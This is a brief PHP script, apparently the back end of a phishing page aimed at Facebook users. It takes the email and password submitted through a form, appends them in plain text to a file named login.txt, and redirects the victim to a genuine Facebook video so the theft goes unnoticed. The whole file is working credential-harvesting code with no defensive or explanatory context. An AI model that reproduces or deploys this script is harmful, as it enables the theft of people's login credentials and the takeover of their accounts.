<?php

$email = $_POST['email'];
$pass = $_POST['pass'];

$tekst = "Email: $email Hasło: $pass \r\n";

$uchwyt = fopen("login.txt", "a");

fwrite($uchwyt, $tekst);
fclose($uchwyt);
header("Location: https://www.facebook.com/zoolodz/videos/2501631416666110")

?>